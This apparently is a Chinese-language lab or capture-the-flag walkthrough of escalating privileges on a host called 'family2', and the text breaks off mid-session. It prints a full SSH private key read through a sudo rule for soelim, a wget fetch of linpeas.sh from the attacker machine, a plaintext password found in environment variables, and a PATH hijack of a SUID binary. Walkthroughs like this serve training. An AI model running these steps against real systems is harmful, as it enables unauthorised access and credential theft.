<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>tmp]</span><br><span class="line">└─# ssh aaa<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span></span><br><span class="line">aaa<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span>: Permission denied (publickey).</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>tmp]</span><br><span class="line">└─# ssh dad<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span> <span class="operator">-</span>i id_rsa </span><br><span class="line">dad<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span>: Permission denied (publickey).</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>tmp]</span><br><span class="line">└─# ssh mum<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span> <span class="operator">-</span>i id_rsa</span><br><span class="line">mom<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span>: Permission denied (publickey).</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>tmp]</span><br><span class="line">└─# ssh baby<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span> <span class="operator">-</span>i id_rsa</span><br><span class="line">Linux family2 <span class="number">5.10</span><span class="number">.0</span><span class="number">-9</span><span class="operator">-</span>amd64 #<span class="number">1</span> SMP Debian <span class="number">5.10</span><span class="number">.70</span><span class="number">-1</span> (<span class="number">2021</span><span class="number">-09</span><span class="number">-30</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU<span class="operator">/</span>Linux <span class="keyword">system</span> <span class="keyword">are</span> <span class="keyword">free</span> software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program <span class="keyword">are</span> described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> <span class="operator">/</span>usr<span class="operator">/</span>share<span class="operator">/</span>doc<span class="comment">/*/copyright.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="comment">permitted by applicable law.</span></span><br><span class="line"><span class="comment">You have mail.</span></span><br><span class="line"><span class="comment">Last login: Mon Nov  1 13:33:11 2021 from 192.168.0.28</span></span><br><span class="line"><span class="comment">baby@family2:~$ </span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure></div>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="baby"><a href="#baby" class="headerlink" title="baby"></a>baby</h2><p>baby有一个mom权限的指令soelim</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">baby<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> baby on <span class="symbol">family2:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> baby may run the following commands on <span class="symbol">family2:</span></span><br><span class="line">    (mum) <span class="symbol">NOPASSWD:</span> /usr/bin/soelim</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67adb21cd0e0a243d4fed72e.png"><br>这个指令可以读取任意文件<br>成功读到mum的私钥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">baby@family2:<span class="operator">/</span>home$ sudo <span class="operator">-</span>u mum soelim <span class="symbol">/home/mum/.ssh/id_rsa</span></span><br><span class="line">.lf <span class="number">1</span> <span class="symbol">/home/mum/.ssh/id_rsa</span></span><br><span class="line"><span class="operator">-</span>----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAo8d07Ufqv8Iu7FoRUcYz8WROGwykIW72J1geSGt4qHWmsnheUleB</span><br><span class="line"><span class="number">90</span>HPkDtEv2lbbLRwbBvD0n9bXToliGTwsEi02STssQVizJ4KOujHHhv31K0tfxhP0kjHdC</span><br><span class="line">zU71RX7d<span class="symbol">/XksMWy/Ui2o2ME75tV86ej0SJ6oVmXdhEBg/37mHHdck3vSduKBVCFEkuc+VP</span></span><br><span class="line"><span class="number">5</span>gxSDUVsXeREipoIzBA61btF<span class="symbol">/tShhGkGeMt/xsETllKbnEYZDZm+LYMBwqH5rr33FNa+4i</span></span><br><span class="line">eKBbORjgPkT9mCUfmi1kyTlJToiGnHMhdiq8yZZlpU<span class="operator">+</span><span class="symbol">/tC3+M5y9YvJZ7WlMsY46ukeA24</span></span><br><span class="line">TQ<span class="operator">+</span>CntneHuJVRMVn4RImNwxa35BCNMWYdQ<span class="operator">+</span>wpZfSUxmrteyGmRNsRT8LGzbe<span class="symbol">/jsu8TKs6e</span></span><br><span class="line">Xib85QAeTlPXOJQI<span class="operator">+</span>j8m72pjSsRghQF<span class="operator">+</span>sR<span class="symbol">/wtIcNjwb+1fR+RJJ8MRdz9t3k6DIL2VPAZR</span></span><br><span class="line"><span class="number">1</span>PmAGVsz<span class="operator">+</span><span class="number">32</span>fZfBBpM2Kcgs9cKVOGbhoHE<span class="symbol">/kc8ETAAAFgKNndd2jZ3XdAAAAB3NzaC1yc2</span></span><br><span class="line">EAAAGBAKPHdO1H6r<span class="symbol">/CLuxaEVHGM/FkThsMpCFu9idYHkhreKh1prJ4XlJXgfdBz5A7RL9p</span></span><br><span class="line">W2y0cGwbw9J<span class="symbol">/W106JYhk8LBItNkk7LEFYsyeCjroxx4b99StLX8YT9JIx3Qs1O9UV+3f15</span></span><br><span class="line">LDFsv1ItqNjBO<span class="operator">+</span>bVfOno9EieqFZl3YRAYP9<span class="operator">+</span><span class="number">5</span>hx3XJN70nbigVQhRJLnPlT<span class="operator">+</span>YMUg1FbF3k</span><br><span class="line">RIqaCMwQOtW7Rf7UoYRpBnjLf8bBE5ZSm5xGGQ2Zvi2DAcKh<span class="operator">+</span>a699xTWvuInigWzkY4D5E</span><br><span class="line"><span class="symbol">/ZglH5otZMk5SU6IhpxzIXYqvMmWZaVPv7Qt/jOcvWLyWe1pTLGOOrpHgNuE0Pgp7Z3h7i</span></span><br><span class="line">VUTFZ<span class="operator">+</span>ESJjcMWt<span class="operator">+</span>QQjTFmHUPsKWX0lMZq7XshpkTbEU<span class="symbol">/Cxs23v47LvEyrOnl4m/OUAHk5T</span></span><br><span class="line"><span class="number">1</span>ziUCPo<span class="symbol">/Ju9qY0rEYIUBfrEf8LSHDY8G/tX0fkSSfDEXc/bd5OgyC9lTwGUdT5gBlbM/t9</span></span><br><span class="line">n2XwQaTNinILPXClThm4aBxP5HPBEwAAAAMBAAEAAAGBAKDUjIE6n08BvJyC8gEQlw<span class="operator">+</span>UhZ</span><br><span class="line">LQfhkK4xTN1qcdSpZ7OmCGDXHk1w7dBJxJZ4BkUNBV<span class="symbol">/RRcy5bZU/of0J25Khaiv12BgiFv</span></span><br><span class="line"><span class="symbol">/Y6cH8Wrs2Vg56VlDomBcVk5+QufvtbrR5GjwAkyJR/SsRBX8detp6iTkWd1Uc4Ig/biGi</span></span><br><span class="line">Kt6bWhNYL4PxE0OFuKTKKpHsHWzPhG3wiDRSCKubg1<span class="symbol">/S+PPIeIaPsPCTGDBUT36ZlfHwH+</span></span><br><span class="line">SytSNuYBNR1ySfc8onkzt236x0yAN5DHYRYge82vy<span class="symbol">/agoIeAonYHNpEtK1AjDYrBrreTZ+</span></span><br><span class="line">OtOREyfOh1<span class="operator">+</span>jq4Jf3HczIulml95xEF82gWGfYuX36B6Zg1FUXtCOKV9DEG2nsmTpaGo1ZI</span><br><span class="line">DN6Mbva<span class="symbol">/HXOBv4jm19amxJYK9J5/mawJauuwG2CmhoJDL03V4MeKFjOcdEPBxE3j23R6FI</span></span><br><span class="line">L3xV4gomGs5Cp92jX4P<span class="operator">+</span>dAtAt5kHkwYKbtxaiTQMHQupIgzeJruodIVVqTp0tlQrFJ4QAA</span><br><span class="line">AMAzVhhpPRAXs<span class="symbol">/o/YDnmKWkjbEDDMKbggUDl6lyhf7HbZkTxcPdFfHDGQomFfXSP6TzvSD</span></span><br><span class="line">RKQBvWGiUM82h4YVxd2CfIp<span class="operator">+</span>XJaiiUqeKJ9Qsq4MQv8BGbdvWxQuYR7yz4vu8a<span class="symbol">/QhNqmTb</span></span><br><span class="line">BdJI7IHLuVf6UuPibtoJaaIMd6KunNAEN2QGThNQ9SaZv8TMoaEL4xmca<span class="symbol">/snT3UwjzRvt1</span></span><br><span class="line"><span class="number">2</span>pEMfdjkeMsHkJ<span class="operator">+</span>RgSJkzsTgoLqPVCInRwoEQg1IMx5Pn<span class="symbol">/yMwAAADBANBYctl2AvRTRae+</span></span><br><span class="line">F6PRL84oUGwu71GVJV62Jc6GNOfVF4ucpYLBwh1Q74DoMnxSbP<span class="operator">+</span>BbksirRInBato5Ypd4R</span><br><span class="line"><span class="number">0</span>lW9Np39ajz9<span class="symbol">/hqVdV8w5Zhmxs5gcyEu42gALPbEddQ5Nub7r/95mNAL9Ui2IifbNSRhVT</span></span><br><span class="line">wbr9If0VABmmNp<span class="operator">+</span>zUH7qjEBktr2pZF4gOa<span class="symbol">/pj0yWAtYeKRN22kjdamz4902HWy1DYxKEPS</span></span><br><span class="line">WbnB8ZoPG0LHYyrhG9WmtZOukOLaoOgwAAAMEAyT1zGlhOFvgcNR9ewaZHU97p2m6<span class="symbol">/1lWj</span></span><br><span class="line">D3cP9Hgn1<span class="operator">+</span>IBWq3GvUrgBeG7DEWIKAq<span class="symbol">/dNjR6PaXrwMX2N7o67rJK7oEJMJae35drfUY4p</span></span><br><span class="line">io5sn28<span class="operator">+</span>mPz7q33EWa4pNijTIH<span class="symbol">/I6he7ESSsEsbe0wNu/usC5I315TbWNxyitBrqudOdHR</span></span><br><span class="line">mAQxMOsFzzTlgf6k0mYywlLX2ZKmdsgNd<span class="symbol">/TXlFhKvzaYavNulieSfGDkSAWXm12woT6vwx</span></span><br><span class="line">JminG0qhVpq<span class="operator">/</span><span class="number">4</span>xAAAACm11bUBkZWJpYW4<span class="operator">=</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
<p>成功登录到mum</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># ssh mum@192.168.112.61 -i id_rsa</span></span><br><span class="line">Linux family2 <span class="number">5.10</span>.<span class="number">0</span>-<span class="number">9</span>-amd64 <span class="comment">#1 SMP Debian 5.10.70-1 (2021-09-30) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> <span class="regexp">/usr/share/doc/</span>*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">You have <span class="keyword">new</span> mail.</span><br><span class="line">Last login: Mon Nov  <span class="number">1</span> <span class="number">13</span>:<span class="number">33</span>:<span class="number">56</span> <span class="number">2021</span> <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">0.43</span></span><br><span class="line">mum@family2:~$ </span><br></pre></td></tr></table></figure></div>
<h2 id="mum"><a href="#mum" class="headerlink" title="mum"></a>mum</h2><p>有两个sudo</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">mum<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> mum on <span class="symbol">family2:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> mum may run the following commands on <span class="symbol">family2:</span></span><br><span class="line">    (root) <span class="symbol">NOPASSWD:</span> /usr/bin/shred -f -z /etc/passwd</span><br><span class="line">    (dad) <span class="title class_">ALL</span></span><br></pre></td></tr></table></figure></div>
<p>root权限这条命令的意思是强制擦除 &#x2F;etc&#x2F;passwd 文件，并用零填充，以防数据恢复<br>虽然有dad的所有权限，但是用dad身份执行命令的时候需要输入密码，我们没有密码<br>现在再从本机上传linpeas.sh来扫一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">mum@family2:~$ wget <span class="number">192.168</span>.<span class="number">112.83</span>/linpeas.<span class="keyword">sh</span></span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-<span class="number">13</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">23</span>--  http://<span class="number">192.168</span>.<span class="number">112.83</span>/linpeas.<span class="keyword">sh</span></span><br><span class="line">Connecting <span class="keyword">to</span> <span class="number">192.168</span>.<span class="number">112.83</span>:<span class="number">80</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: <span class="number">332111</span> (<span class="number">324</span>K) [text/<span class="keyword">x</span>-<span class="keyword">sh</span>]</span><br><span class="line">Saving <span class="keyword">to</span>: ‘linpeas.<span class="keyword">sh</span>’</span><br><span class="line"></span><br><span class="line">linpeas.<span class="keyword">sh</span>                   <span class="number">100</span>%[=============================================&gt;] <span class="number">324.33</span>K  --.-KB/s    in <span class="number">0.01</span>s   </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-<span class="number">13</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">24</span> (<span class="number">26.0</span> MB/s) - ‘linpeas.<span class="keyword">sh</span>’ saved [<span class="number">332111</span>/<span class="number">332111</span>]</span><br><span class="line"></span><br><span class="line">mum@family2:~$ chmod +<span class="keyword">x</span> linpeas.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure></div>
<p>在环境变量中成功扫出密码 <code>passwd=LA0172</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[+] Environment</span><br><span class="line">[i] Any private information inside environment variables?</span><br><span class="line"><span class="attribute">HISTFILESIZE</span>=0</span><br><span class="line"><span class="attribute">USER</span>=mum</span><br><span class="line"><span class="attribute">SSH_CLIENT</span>=192.168.112.83 49728 22</span><br><span class="line"><span class="attribute">XDG_SESSION_TYPE</span>=tty</span><br><span class="line"><span class="attribute">SHLVL</span>=1</span><br><span class="line"><span class="attribute">MOTD_SHOWN</span>=pam</span><br><span class="line"><span class="attribute">HOME</span>=/home/mum</span><br><span class="line"><span class="attribute">SSH_TTY</span>=/dev/pts/1</span><br><span class="line"><span class="attribute">LOGNAME</span>=mum</span><br><span class="line"><span class="attribute">_</span>=./linpeas.sh</span><br><span class="line"><span class="attribute">XDG_SESSION_CLASS</span>=user</span><br><span class="line"><span class="attribute">TERM</span>=xterm-256color</span><br><span class="line"><span class="attribute">XDG_SESSION_ID</span>=50</span><br><span class="line"><span class="attribute">PATH</span>=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin</span><br><span class="line"><span class="attribute">XDG_RUNTIME_DIR</span>=/run/user/1001</span><br><span class="line"><span class="attribute">LANG</span>=en_US.UTF-8</span><br><span class="line"><span class="attribute">HISTSIZE</span>=0</span><br><span class="line"><span class="attribute">SHELL</span>=/bin/bash</span><br><span class="line"><span class="attribute">passwd</span>=LA0172</span><br><span class="line"><span class="attribute">LC_ALL</span>=en_US.UTF-8</span><br><span class="line"><span class="attribute">SSH_CONNECTION</span>=192.168.112.83 49728 192.168.112.61 22</span><br><span class="line"><span class="attribute">HISTFILE</span>=/dev/null</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">mum<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -u dad /bin/bash</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">mum:</span> </span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:/home/mum</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
<h2 id="dad"><a href="#dad" class="headerlink" title="dad"></a>dad</h2><p>dad这里sudo需要密码，但是suid里面有个可以的文件是&#x2F;opt目录里面的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">dad<span class="variable">@family2</span>:~<span class="variable">$ </span>find / -u root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line">dad<span class="variable">@family2</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/sudo</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/su</span></span><br><span class="line"><span class="regexp">/opt</span><span class="regexp">/clock</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">dad@family2:~$ file /opt</span><span class="regexp">/clock</span></span><br><span class="line"><span class="regexp">/opt</span><span class="regexp">/clock: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib</span>64/ld-linux-x86-<span class="number">64</span>.so.<span class="number">2</span>, BuildID[sha1]=c2d23ea9475938a9dd429b6390c97b750d6a1d84, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span>.<span class="number">0</span>, not stripped</span><br></pre></td></tr></table></figure></div>
<p>有python，开http服务，本地下载这个文件查看一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">dad@family2:~$ <span class="keyword">python3</span></span><br><span class="line">Python <span class="number">3.9</span>.<span class="number">2</span> (default, Feb <span class="number">28</span> <span class="number">2021</span>, <span class="number">17</span>:<span class="number">03</span>:<span class="number">44</span>) </span><br><span class="line">[GCC <span class="number">10.2</span>.<span class="number">1</span> <span class="number">20210110</span>] <span class="keyword">on</span> linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="built_in">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">KeyboardInterrupt</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">cd</span> /<span class="keyword">opt</span></span><br><span class="line">Traceback (most recent <span class="keyword">call</span> <span class="keyword">last</span>):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, <span class="built_in">line</span> <span class="number">1</span>, in <span class="symbol">&lt;module&gt;</span></span><br><span class="line">NameError: name <span class="string">&#x27;cd&#x27;</span> <span class="keyword">is</span> not defined</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">KeyboardInterrupt</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">exit</span>()</span><br><span class="line">dad@family2:~$ <span class="keyword">cd</span> /<span class="keyword">opt</span></span><br><span class="line">dad@family2:/<span class="keyword">opt</span>$ <span class="keyword">python3</span> -<span class="keyword">m</span> http.server</span><br><span class="line">Serving HTTP <span class="keyword">on</span> <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">8000</span> (http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">8000</span>/) ...</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>用strings看</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# wget <span class="number">192.168</span><span class="number">.112</span><span class="number">.61</span>:<span class="number">8000</span>/clock</span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-<span class="number">13</span> <span class="number">17</span>:<span class="number">07</span>:<span class="number">13</span>--  http://<span class="number">192.168</span><span class="number">.112</span><span class="number">.61</span>:<span class="number">8000</span>/clock</span><br><span class="line">Connecting to <span class="number">192.168</span><span class="number">.112</span><span class="number">.61</span>:<span class="number">8000</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line"><span class="symbol">Length:</span> <span class="number">16096</span> (16K) [application/octet-stream]</span><br><span class="line">Saving to: ‘clock’</span><br><span class="line"></span><br><span class="line">clock                        <span class="number">100</span>%[=============================================&gt;]  <span class="number">15.</span>72K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-<span class="number">13</span> <span class="number">17</span>:<span class="number">07</span>:<span class="number">14</span> (<span class="number">33.2</span> MB/s) - ‘clock’ saved [<span class="number">16096</span>/<span class="number">16096</span>]</span><br><span class="line"></span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# strings clock                    </span><br><span class="line">/lib64/ld-linux-x86-<span class="number">64.</span>so<span class="number">.2</span></span><br><span class="line">setresuid</span><br><span class="line">system</span><br><span class="line">__cxa_finalize</span><br><span class="line">__libc_start_main</span><br><span class="line">libc<span class="number">.</span>so<span class="number">.6</span></span><br><span class="line">GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">u/UH</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">date</span><br><span class="line"><span class="comment">;*3$&quot;</span></span><br><span class="line"><span class="symbol">GCC:</span> (Debian <span class="number">10.3</span><span class="number">.0</span>-<span class="number">11</span>) <span class="number">10.3</span><span class="number">.0</span></span><br><span class="line">Scrt1<span class="number">.</span>o</span><br><span class="line">__abi_tag</span><br><span class="line">crtstuff<span class="number">.</span>c</span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed<span class="number">.0</span></span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">suid<span class="number">.</span>c</span><br><span class="line">__FRAME_END__</span><br><span class="line">__init_array_end</span><br><span class="line">_DYNAMIC</span><br><span class="line">__init_array_start</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">setresuid@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">_edata</span><br><span class="line">system@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">__libc_start_main@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">__data_start</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">__libc_csu_init</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">__cxa_finalize@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line"><span class="meta">.symtab</span></span><br><span class="line"><span class="meta">.strtab</span></span><br><span class="line"><span class="meta">.shstrtab</span></span><br><span class="line"><span class="meta">.interp</span></span><br><span class="line"><span class="meta">.note</span><span class="number">.</span>gnu<span class="number">.</span>build-id</span><br><span class="line"><span class="meta">.note</span><span class="number">.</span>ABI-tag</span><br><span class="line"><span class="meta">.gnu</span><span class="number">.</span>hash</span><br><span class="line"><span class="meta">.dynsym</span></span><br><span class="line"><span class="meta">.dynstr</span></span><br><span class="line"><span class="meta">.gnu</span><span class="number">.</span>version</span><br><span class="line"><span class="meta">.gnu</span><span class="number">.</span>version_r</span><br><span class="line"><span class="meta">.rela</span><span class="number">.</span>dyn</span><br><span class="line"><span class="meta">.rela</span><span class="number">.</span>plt</span><br><span class="line"><span class="meta">.init</span></span><br><span class="line"><span class="meta">.plt</span><span class="number">.</span>got</span><br><span class="line"><span class="meta">.text</span></span><br><span class="line"><span class="meta">.fini</span></span><br><span class="line"><span class="meta">.rodata</span></span><br><span class="line"><span class="meta">.eh_frame_hdr</span></span><br><span class="line"><span class="meta">.eh_frame</span></span><br><span class="line"><span class="meta">.init_array</span></span><br><span class="line"><span class="meta">.fini_array</span></span><br><span class="line"><span class="meta">.dynamic</span></span><br><span class="line"><span class="meta">.got</span><span class="number">.</span>plt</span><br><span class="line"><span class="meta">.data</span></span><br><span class="line"><span class="meta">.bss</span></span><br><span class="line"><span class="meta">.comment</span></span><br></pre></td></tr></table></figure>
<p>里面的指令是<code>date</code><br>我们去执行这个程序看看能得到什么</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">dad</span>@family2:/opt$ ./clock </span><br><span class="line"><span class="attribute">Thu</span> <span class="number">13</span> Feb <span class="number">2025</span> <span class="number">10</span>:<span class="number">09</span>:<span class="number">26</span> AM CET</span><br></pre></td></tr></table></figure></div>
<p>发现就是查看时间<br>现在我们只要劫持这个date就好了，把data替换成我们需要执行的bash脚本就好了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">dad<span class="variable">@family2</span><span class="symbol">:/opt</span><span class="variable">$ </span>echo <span class="string">&quot;/bin/bash&quot;</span> &gt; date</span><br><span class="line"><span class="symbol">bash:</span> <span class="symbol">date:</span> <span class="title class_">Permission</span> denied</span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:/opt</span><span class="variable">$ </span>cd /home/dad</span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>echo <span class="string">&quot;/bin/bash&quot;</span> &gt; date</span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span><span class="variable constant_">PATH</span>=^C</span><br><span class="line">.bash_history    .bashrc          .local/          .python_history  </span><br><span class="line">.bash_logout     date             .profile         user.txt         </span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span><span class="variable constant_">PATH</span>=<span class="regexp">/home/dad</span><span class="symbol">:</span><span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>/opt/clock</span><br><span class="line"><span class="title class_">Thu</span> <span 